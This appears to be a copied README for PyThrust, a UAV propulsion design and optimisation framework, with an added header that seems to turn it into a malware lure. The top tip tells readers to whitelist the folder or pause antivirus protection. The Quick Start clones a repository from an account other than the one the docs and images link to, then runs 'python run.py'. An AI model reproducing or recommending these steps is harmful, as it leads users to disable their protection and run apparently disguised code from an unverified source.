
> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/PatchBearPlant/PyThrust.git
cd PyThrust
python run.py
```


![PyThrust Banner](https://raw.githubusercontent.com/Setuav/PyThrust/main/docs/images/PyThrust_banner.png)

# PyThrust

PyThrust is an open-source framework for electric propulsion system analysis, co-design, and parameter optimization in UAV applications. It can be used for multidisciplinary design optimization (MDO) within OpenMDAO. It includes steady-state performance solvers, auto-tuning calibration tools to fit manufacturer test data, and database search tools to map theoretical designs onto real-world brushless motor and propeller catalogs.

## Design and Analysis Visualization

| 1. Propulsion Co-Design Optimization | 2. Propulsion Calibration & Auto-Tuning |
| :---: | :---: |
| ![Propulsion Co-Design Optimization](https://raw.githubusercontent.com/Setuav/PyThrust/main/docs/images/optimize_and_plot_results.png) | ![Propulsion Calibration & Auto-Tuning Results](https://raw.githubusercontent.com/Setuav/PyThrust/main/docs/images/calibration_results.png) |
| **3. Propeller Aerodynamic Coefficients** | **4. Hover Efficiency Heatmap** |
| ![Propeller Aerodynamic Coefficients](https://raw.githubusercontent.com/Setuav/PyThrust/main/docs/images/propeller_coefficients.png) | ![Hover Efficiency Heatmap](https://raw.githubusercontent.com/Setuav/PyThrust/main/docs/images/efficiency_heatmap.png) |

### 5. PyBaMM Electrochemical Battery Simulation (Dynamic Load)
![PyBaMM Electrochemical Battery Simulation](https://raw.githubusercontent.com/Setuav/PyThrust/main/docs/images/pybamm_mission_results.png)

## Documentation

Please see the [docs/](https://github.com/Setuav/PyThrust/tree/main/docs) folder for design specifications, core mathematical model descriptions, and database details.

## License

PyThrust is licensed under the Apache License, Version 2.0 (the "License"). See [LICENSE](https://github.com/Setuav/PyThrust/blob/main/LICENSE) for the full license.

## Copyright

Copyright (c) 2026 Setuav. All rights reserved.

<!-- Last updated: 2026-06-09 18:56:16 -->
